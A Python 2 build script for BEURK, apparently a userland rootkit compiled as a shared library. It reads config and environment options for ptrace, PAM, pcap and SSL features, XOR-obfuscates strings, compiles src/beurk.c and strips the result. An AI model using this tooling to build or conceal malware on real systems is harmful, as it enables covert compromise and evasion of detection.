#!/usr/bin/env python2

import sys, os
import commands
from pprint import pprint

def help():
    """display usage help message and exit
    """
    print("Usage: %s <config-file>" % sys.argv[0])
    sys.exit(1)

def abort(msg):
    """abort builder with given error message
    """
    sys.exit("%s: *** %s ***" % (sys.argv[0], msg))

if len(sys.argv) != 2:
    help()


###############################################################################
### parse config file and beurk env vars

# special types for config var values
def type_str(v):
    assert str(v)
    return str(v)

def type_bool(v):
    assert v.lower() in ["true", "false"]
    return True if v.lower() == "true" else False

def type_int(v):
    return int(v)

def type_hexbyte(v):
    v = int(v, 16)
    assert -1 < v < 0x100
    return v

# the list of config keys (with their associated expected type)
CONFIG_KEYS = {
        "LIBRARY_NAME": type_str,
        "DEBUG_LEVEL": type_int,
        "ENABLE_PTRACE": type_bool,
        "ENABLE_PAM": type_bool,
        "ENABLE_PCAP": type_bool,
        "ENABLE_SSL": type_bool,
        "CC": type_str,
        "XOR_KEY": type_hexbyte,
        }

def get_config(lines, check_missing_vars=True):
    result = {}
    for lineno, line in enumerate(lines, 1):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if '=' not in line:
            raise SyntaxError("line %d: expected key=val" % lineno)
        key, val = [x.strip() for x in line.split("=", 1)]
        if key in result.keys():
            raise SyntaxError("line %d: %r declared twice" % (lineno, key))
        if key not in CONFIG_KEYS.keys():
            raise SyntaxError("line %d: unknown key: %r" % (lineno, key))
        func_ptr = CONFIG_KEYS[key]
        try:
            val = func_ptr(val)
        except Exception as e:
            func_name = func_ptr.__name__.replace("_", " ")
            msg = "line %d: %r expects %s"
            raise SyntaxError(msg % (lineno, key, func_name))
        result[key] = val
    if check_missing_vars:
        for expected_key in CONFIG_KEYS.keys():
            if expected_key not in result.keys():
                raise SyntaxError("key %r is not defined" % expected_key)
    return result

# read config file
try:
    config_lines = open(sys.argv[1]).read().splitlines()
    config = get_config(config_lines)
except Exception as e:
    sys.stderr.write("config file error: %s:\n" % sys.argv[1])
    sys.exit("-> %s" % e)

# read beurk environment variables
for key, val in os.environ.items():
    if not key.startswith("BEURK_"):
        continue
    try:
        config.update(get_config([key[6:] + "=" + val], False))
    except SyntaxError as e:
        e = str(e)
        if e.startswith("line 1:"):
            e = e[8:]
        errmsg = "environment override error (on %r):\n"
        sys.stderr.write(errmsg % key)
        sys.exit("-> %s" % e)


###############################################################################
### chdir to project's root

ret, out = commands.getstatusoutput("git rev-parse --show-toplevel")
if ret == 0:
    os.chdir(out.strip())


###############################################################################
### generate config.h

def xor(string):
    """xor (obfuscate) given string with XOR_KEY config var
    """
    key = config["XOR_KEY"]
    result = ""
    for char in string:
        result += "\\x" + hex(ord(char) ^ key)[2:]
    return result




###############################################################################
### check dependencies

def check_lib_dependencies(*checklibs):
    """test current system for BEURK dependencies
    """
    deps = {"libpam": "security/pam_appl.h",
            "libssl": "openssl/sha.h",
            "libpcap": "pcap/pcap.h"}
    include_path = [
            "/usr/include",
            "/usr/local/include"]
    missing_deps = 0

    for dep, header in deps.items():
        if dep not in checklibs:
            continue
        for include_dir in include_path:
            header_path = os.path.join(include_dir, header)
            if os.path.isfile(header_path):
                break
        else:
            msg = "Dependency not satisfied: %s-dev (header files)."
            sys.stderr.write("%s\n" % msg % dep)
            missing_deps += 1
    return False if missing_deps else True

checklibs = []
if config["ENABLE_PCAP"]:
    checklibs.append("libpcap")
if config["ENABLE_PAM"]:
    checklibs.append("libpam")
if config["ENABLE_SSL"]:
    checklibs.append("libssl")

if not check_lib_dependencies(*checklibs):
    abort("missing dependencies")


###############################################################################
### compile library

def run_build_command(cmd):
    """function which runs a build shell command
    """
    cmd = cmd.format(**config)
    print(cmd)
    if os.system(cmd) != 0:
        abort("build command failed")

SOURCES = [
        "src/beurk.c",
        ]

config["CFLAGS"] = """
-Iincludes -Wall -Wextra
-Wdisabled-optimization -Winline
-Wunsuffixed-float-constants
-Wdouble-promotion -Wunknown-pragmas
-Wno-unknown-warning-option
-mtune=native
""".replace("\n", " ")

config["LDFLAGS"] = "-lc -ldl -lutil "
if config["ENABLE_PAM"]:
    config["LDFLAGS"] += "-lpam "

# build objects from sources
for source in SOURCES:
    dest = source.replace(".c", ".o")
    run_build_command("{CC} {CFLAGS} -fPIC -g -c %s -o %s" % (source, dest))

# build library from objects
objects = " ".join([x.replace(".c", ".o") for x in SOURCES])
run_build_command("{CC} -fPIC -shared -Wl,-soname,{LIBRARY_NAME} " \
        + objects + " {LDFLAGS} -o {LIBRARY_NAME}")

# strip if no debug mode
if config["DEBUG_LEVEL"] == 0:
    run_build_command("strip {LIBRARY_NAME}")
